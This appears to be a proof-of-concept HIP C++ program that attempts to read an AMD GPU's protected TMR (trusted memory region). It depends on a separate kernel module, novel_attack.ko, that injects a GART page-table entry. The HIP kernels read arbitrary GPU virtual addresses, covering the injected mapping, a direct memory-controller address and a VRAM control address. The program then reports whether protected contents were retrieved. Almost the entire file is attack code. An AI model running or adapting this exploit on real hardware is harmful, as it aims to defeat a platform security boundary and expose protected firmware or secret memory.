/*
 * gpu_tmr_read.hip — GPU-side TMR read via GART PTE injection
 *
 * Step 1: Kernel module injects GART PTE mapping GPU VA → TMR MC addr
 * Step 2: This HIP kernel reads from that GPU VA
 * Step 3: If GPU MMU bypasses DF protection, we get TMR content!
 *
 * The GPU compute unit accesses VRAM through L1/L2/MC —
 * a DIFFERENT path than CPU reads (which go through DF).
 *
 * Usage:
 *   1. Load novel_attack.ko (injects GART PTE)
 *   2. Run: HSA_OVERRIDE_GFX_VERSION=11.0.0 ./gpu_tmr_read
 *   3. Check output for TMR content
 */
#include <hip/hip_runtime.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

// GPU kernel: read from arbitrary GPU VA and write to output buffer
__global__ void read_vram(uint64_t src_addr, uint32_t *dst, int count) {
    int tid = threadIdx.x;
    if (tid < count) {
        // Cast the GPU VA to a pointer and read
        volatile uint32_t *src = (volatile uint32_t *)src_addr;
        dst[tid] = src[tid];
    }
}

// Alternative: use flat_load instructions via inline assembly
__global__ void read_vram_flat(uint64_t src_addr, uint32_t *dst, int count) {
    int tid = threadIdx.x;
    if (tid < count) {
        uint32_t val;
        uint64_t addr = src_addr + tid * 4;
        // Use flat_load to access arbitrary GPU VA
        asm volatile("flat_load_dword %0, %1" : "=v"(val) : "v"(addr));
        dst[tid] = val;
    }
}

int main() {
    printf("=== GPU-SIDE TMR READ ===\n");

    // TMR GART VA from our PTE injection
    // GART VA = 0x7FFF03000 (PTE slot 3, maps to TMR MC 0x97E0000000)
    uint64_t tmr_gart_va = 0x7FFF03000ULL;

    // Also try direct TMR MC address (GPU compute might access MC directly)
    uint64_t tmr_mc_direct = 0x97E0000000ULL;

    // Also try the known accessible VRAM address (control test)
    uint64_t vram_control = 0x80007EE000ULL; // trampoline BO

    uint32_t *d_output;
    uint32_t h_output[256];
    int count = 64;

    hipMalloc(&d_output, count * sizeof(uint32_t));

    // Test 1: Read from known-good VRAM address (control)
    printf("\n--- Test 1: Known VRAM (control) ---\n");
    memset(h_output, 0xAA, sizeof(h_output));
    hipMemset(d_output, 0, count * sizeof(uint32_t));
    hipLaunchKernelGGL(read_vram, 1, count, 0, 0,
                       vram_control, d_output, count);
    hipDeviceSynchronize();
    hipMemcpy(h_output, d_output, count * sizeof(uint32_t), hipMemcpyDeviceToHost);
    printf("VRAM[0]: %08X %08X %08X %08X\n",
           h_output[0], h_output[1], h_output[2], h_output[3]);
    printf("VRAM[4]: %08X %08X %08X %08X\n",
           h_output[4], h_output[5], h_output[6], h_output[7]);

    // Test 2: Read from TMR via GART PTE
    // NOTE: GART PTE must be injected by kernel module BEFORE this runs!
    printf("\n--- Test 2: TMR via GART VA 0x%lX ---\n", tmr_gart_va);
    memset(h_output, 0xBB, sizeof(h_output));
    hipMemset(d_output, 0xBB, count * sizeof(uint32_t));
    hipLaunchKernelGGL(read_vram, 1, count, 0, 0,
                       tmr_gart_va, d_output, count);
    hipError_t err = hipDeviceSynchronize();
    printf("hipDeviceSynchronize: %s\n", hipGetErrorString(err));
    hipMemcpy(h_output, d_output, count * sizeof(uint32_t), hipMemcpyDeviceToHost);
    printf("TMR_GART[0]: %08X %08X %08X %08X\n",
           h_output[0], h_output[1], h_output[2], h_output[3]);
    printf("TMR_GART[4]: %08X %08X %08X %08X\n",
           h_output[4], h_output[5], h_output[6], h_output[7]);

    // Check if we got real data (not 0xBB or 0xFF)
    int has_data = 0;
    for (int i = 0; i < count; i++) {
        if (h_output[i] != 0xBBBBBBBB && h_output[i] != 0xFFFFFFFF && h_output[i] != 0) {
            has_data = 1;
            break;
        }
    }
    if (has_data)
        printf("*** TMR DATA RETRIEVED VIA GPU! ***\n");
    else
        printf("TMR read returned zeros/FF/BB — may be blocked or PTE not active\n");

    // Test 3: Direct TMR MC address access from GPU
    printf("\n--- Test 3: TMR via direct MC 0x%lX ---\n", tmr_mc_direct);
    memset(h_output, 0xCC, sizeof(h_output));
    hipMemset(d_output, 0xCC, count * sizeof(uint32_t));
    hipLaunchKernelGGL(read_vram, 1, count, 0, 0,
                       tmr_mc_direct, d_output, count);
    err = hipDeviceSynchronize();
    printf("hipDeviceSynchronize: %s\n", hipGetErrorString(err));
    hipMemcpy(h_output, d_output, count * sizeof(uint32_t), hipMemcpyDeviceToHost);
    printf("TMR_MC[0]: %08X %08X %08X %08X\n",
           h_output[0], h_output[1], h_output[2], h_output[3]);

    hipFree(d_output);
    printf("\n=== DONE ===\n");
    return 0;
}
